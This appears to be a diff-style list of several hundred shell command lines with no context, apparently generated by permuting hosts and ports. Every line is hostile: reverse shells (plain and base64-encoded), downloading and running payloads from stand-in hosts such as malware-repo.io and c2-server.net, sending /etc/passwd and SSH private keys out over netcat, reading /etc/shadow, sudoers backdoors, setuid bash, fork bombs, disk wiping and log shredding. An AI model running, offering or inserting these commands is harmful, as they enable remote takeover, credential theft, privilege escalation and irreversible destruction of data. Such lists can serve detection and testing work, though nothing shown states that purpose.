+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 172.16.4.2 4444
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://malware-repo.io/test_suite.sh | bash
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 9001
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 9001
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+nc -e /bin/sh 127.0.0.1 9001
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+curl http://c2-server.net/backup_daily.sh | bash
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 443
+bash -i >& /dev/tcp/192.168.1.24/1337 0>&1
+rm -rf / --no-preserve-root
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/passwd | nc 127.0.0.1 443
+cat /etc/shadow
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+nc -e /bin/sh 127.0.0.1 4444
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 1337
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 1337
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 10.10.1.5 9001
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 8888
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+curl http://malware-repo.io/config_prod.sh | bash
+nc -e /bin/sh 192.168.1.24 4444
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+curl http://103.22.12.5/config_prod.sh | bash
+bash -i >& /dev/tcp/10.10.1.5/1337 0>&1
+cat /etc/shadow
+nc -e /bin/sh 10.10.1.5 8888
+cat /etc/passwd | nc 192.168.1.24 1337
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 9001
+nc -e /bin/sh 10.10.1.5 443
+cat /etc/passwd | nc 8.8.4.4 4444
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+curl http://malware-repo.io/auth_server.sh | bash
+sudo chmod 4755 /bin/bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 172.16.4.2 443
+:(){ :|:& };:
+curl http://c2-server.net/webapp.sh | bash
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+cat /etc/shadow
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/passwd | nc 8.8.4.4 1337
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 1337
+dd if=/dev/zero of=/dev/sda
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 192.168.1.24 4444
+:(){ :|:& };:
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 10.10.1.5 1337
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 10.10.1.5 4444
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 9001
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+curl http://103.22.12.5/data_dump.sh | bash
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/passwd | nc 127.0.0.1 443
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+curl http://malware-repo.io/main_script.sh | bash
+cat /etc/passwd | nc 127.0.0.1 443
+rm -rf / --no-preserve-root
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+nc -e /bin/sh 8.8.4.4 9001
+curl http://c2-server.net/auth_server.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 4444
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 8.8.4.4 8888
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 10.10.1.5 9001
+sudo chmod 4755 /bin/bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 4444
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/192.168.1.24/443 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 443
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+:(){ :|:& };:
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+cat /etc/passwd | nc 8.8.4.4 443
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+curl http://malware-repo.io/main_script.sh | bash
+nc -e /bin/sh 172.16.4.2 4444
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 443
+shred -n 33 -uz /var/log/auth.log
+nc -e /bin/sh 127.0.0.1 9001
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://c2-server.net/backup_daily.sh | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 1337
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+rm -rf / --no-preserve-root
+bash -i >& /dev/tcp/172.16.4.2/8888 0>&1
+curl http://103.22.12.5/test_suite.sh | bash
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+nc -e /bin/sh 8.8.4.4 8888
+cat /etc/shadow
+curl http://c2-server.net/webapp.sh | bash
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+nc -e /bin/sh 127.0.0.1 443
+dd if=/dev/zero of=/dev/sda
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/192.168.1.24/1337 0>&1
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+cat /etc/shadow
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 8.8.4.4 1337
+cat /etc/passwd | nc 192.168.1.24 1337
+sudo chmod 4755 /bin/bash
+nc -e /bin/sh 8.8.4.4 9001
+rm -rf / --no-preserve-root
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/10.10.1.5/9001 0>&1
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+nc -e /bin/sh 8.8.4.4 8888
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 4444
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 10.10.1.5 443
+bash -i >& /dev/tcp/10.10.1.5/9001 0>&1
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 8.8.4.4 1337
+bash -i >& /dev/tcp/192.168.1.24/443 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+nc -e /bin/sh 10.10.1.5 443
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+dd if=/dev/zero of=/dev/sda
+curl http://103.22.12.5/auth_server.sh | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/127.0.0.1/443 0>&1
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 10.10.1.5 8888
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 8.8.4.4 443
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 1337
+curl http://103.22.12.5/auth_server.sh | bash
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+curl http://evil-cdn.com/webapp.sh | bash
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+cat /etc/passwd | nc 192.168.1.24 443
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+rm -rf / --no-preserve-root
+curl http://c2-server.net/test_suite.sh | bash
+curl http://c2-server.net/test_suite.sh | bash
+nc -e /bin/sh 8.8.4.4 9001
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 8.8.4.4 8888
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 10.10.1.5 9001
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 127.0.0.1 443
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+nc -e /bin/sh 127.0.0.1 1337
+bash -i >& /dev/tcp/172.16.4.2/1337 0>&1
+nc -e /bin/sh 192.168.1.24 9001
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+nc -e /bin/sh 10.10.1.5 1337
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 443
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+cat /etc/passwd | nc 8.8.4.4 9001
+rm -rf / --no-preserve-root
+cat /etc/shadow
+cat /etc/passwd | nc 10.10.1.5 4444
+sudo chmod 4755 /bin/bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+cat /etc/shadow
+cat /etc/shadow
+:(){ :|:& };:
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+:(){ :|:& };:
+bash -i >& /dev/tcp/8.8.4.4/9001 0>&1
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 4444
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 8888
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 443
+:(){ :|:& };:
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+dd if=/dev/zero of=/dev/sda
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+nc -e /bin/sh 172.16.4.2 4444
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+dd if=/dev/zero of=/dev/sda
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/passwd | nc 172.16.4.2 443
+curl http://malware-repo.io/data_dump.sh | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+cat /etc/passwd | nc 8.8.4.4 1337
+bash -i >& /dev/tcp/8.8.4.4/4444 0>&1
+cat /etc/shadow
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 192.168.1.24 1337
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+shred -n 33 -uz /var/log/auth.log
+cat /etc/shadow
+:(){ :|:& };:
+cat /etc/passwd | nc 192.168.1.24 4444
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+curl http://103.22.12.5/webapp.sh | bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 1337
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 4444
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 9001
+cat /etc/passwd | nc 192.168.1.24 8888
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 8.8.4.4 9001
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 1337
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 1337
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/passwd | nc 127.0.0.1 9001
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 1337
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 192.168.1.24 443
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 1337
+nc -e /bin/sh 10.10.1.5 8888
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+nc -e /bin/sh 127.0.0.1 1337
+bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
+:(){ :|:& };:
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/shadow
+bash -i >& /dev/tcp/172.16.4.2/1337 0>&1
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/shadow
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 1337
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 4444
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+cat /etc/passwd | nc 127.0.0.1 4444
+nc -e /bin/sh 8.8.4.4 1337
+nc -e /bin/sh 10.10.1.5 443
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 172.16.4.2 8888
+dd if=/dev/zero of=/dev/sda
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 10.10.1.5 1337
+cat /etc/passwd | nc 10.10.1.5 9001
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 9001
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+shred -n 33 -uz /var/log/auth.log
+curl http://evil-cdn.com/config_prod.sh | bash
+bash -i >& /dev/tcp/172.16.4.2/8888 0>&1
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+curl http://103.22.12.5/test_suite.sh | bash
+cat /etc/passwd | nc 192.168.1.24 9001
+bash -i >& /dev/tcp/10.10.1.5/4444 0>&1
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+:(){ :|:& };:
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 127.0.0.1 1337
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/10.10.1.5/8888 0>&1
+:(){ :|:& };:
+curl http://evil-cdn.com/auth_server.sh | bash
+cat /etc/shadow
+rm -rf / --no-preserve-root
+nc -e /bin/sh 172.16.4.2 443
+cat /etc/shadow
+cat /etc/shadow
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
